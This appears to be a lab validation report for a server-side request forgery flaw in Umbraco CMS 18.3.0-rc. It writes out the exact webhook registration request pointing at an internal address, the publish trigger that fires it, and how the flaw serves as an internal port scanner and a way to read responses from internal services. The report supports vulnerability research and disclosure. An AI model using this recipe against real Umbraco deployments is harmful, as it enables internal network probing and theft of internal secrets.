# VULN-006 — SSRF via unvalidated webhook target URL

**Software**: Umbraco CMS
**Repository**: https://github.com/umbraco/Umbraco-CMS
**Affected version**: 18.3.0-rc (version.json; commit-pinned, no tagged release)
**Commit**: `cee7d8981ab0fd18b4dc96449ae071edf1aaf21e`
**Status**: CONFIRMED
**Severity (static)**: Medium — CVSS 3.1 `6.5` (`AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N`); rises to High (`~8.5`, C:H) with `Hosting:Debug=true` (this lab) which exposes response bodies.
**Validated at**: 2026-09-29

## Preconditions
- A backoffice user with the **Settings** section (policy `TreeAccessWebhooks`). The exploit provisions a
  **non-admin** Settings-only group + user (admin creates them) to demonstrate the delegable PR:H case, and
  confirms that user can reach `/webhook`. Falls back to the admin client if provisioning is unavailable.
- Webhooks are enabled by default (`WebhookSettings.Enabled = true`, `Period = 00:00:10`).
- An OOB HTTP listener on the host, bound `0.0.0.0:<rnd>`; the app container reaches the host via the docker
  bridge **gateway 172.18.0.1** (network `cvehunterlab_umbraco-cms_default`, subnet 172.18.0.0/16). No
  `host.docker.internal` in the container. Override with `DOCKER_GATEWAY=`.
- All created resources (users, group, doctype, document, webhooks) carry a random suffix; webhooks are
  deleted at the end so they stop firing.

## Request
See `request.http`. The registration (as the Settings user):
`POST /umbraco/management/api/v1/webhook` with `{"url":"http://172.18.0.1:<port>/canary-<rnd>","enabled":true,"events":["Umbraco.ContentPublish"],"headers":{"X-Canary":"<rnd>","X-Attacker":"ssrf"}}`
Trigger: `PUT /umbraco/management/api/v1/document/{id}/publish`.

## Response
See `response.txt`, `evidence/oob_listener.log`, `evidence/webhook_logs.json`:
- **OOB listener captured a POST from the app container (172.18.0.2)** to `/canary-<rnd>`, carrying the
  attacker header `X-Canary` + `X-Attacker: ssrf` and `User-Agent: Umbraco-Cms/18.3.0-rc.preview.34`.
- Webhook log (open target): `statusCode="OK (200)"`, and — because `Hosting:Debug=true` — the full
  `responseHeaders` **and** `responseBody` (`{"oob":"canary-hit","secret":"internal-service-only"}`) are
  returned (the IMDS/secret-read primitive).
- Webhook log (closed internal port): `statusCode="ConnectionError"`, `exceptionOccured=true`,
  `responseBody="ConnectionError: Connection refused (...)"` — open vs closed differ ⇒ internal port scanner.

## Observation
Exactly matches the static finding. `WebhookService.ValidateWebhook` (`WebhookService.cs:37-45`) inspects only
`Events.Length`; the URL is never validated, so an internal/loopback address is accepted. `WebhookFiring`
(`WebhookFiring.cs:112-137`) then POSTs to the raw URL with attacker headers. The blind log oracle works with
no debug; `Hosting:Debug=true` upgrades it to a full response read.

## Side effects
- Per run: 1 doctype, 1 document (published), 2 webhooks (both **deleted** at the end), and (best-effort) 1
  Settings-only user-group + user (left in place; random-suffixed).
- Two webhook-log rows remain (open + closed attempts) for inspection.

## Research & references
- **CVE-2024-29035 / GHSA-74p6-39f2-23v3** — "Blind SSRF … Port Scan by using Webhooks" (affected 13.0.0–13.1.1).
  The 13.1.1 fix only gated the response-body leak behind debug mode and added **no** IP/host filtering —
  source-confirmed still the case at 18.3.0-rc.
- OWASP SSRF Prevention Cheat Sheet; PortSwigger Web Security Academy — SSRF.

## If FAILED
n/a — CONFIRMED. If no OOB hit arrives, check `DOCKER_GATEWAY` (re-derive with
`docker network inspect cvehunterlab_umbraco-cms_default`) and that the listener port is reachable from the
container; the webhook log will still record the attempt (proving the unvalidated fire) even if the host
listener is unreachable.
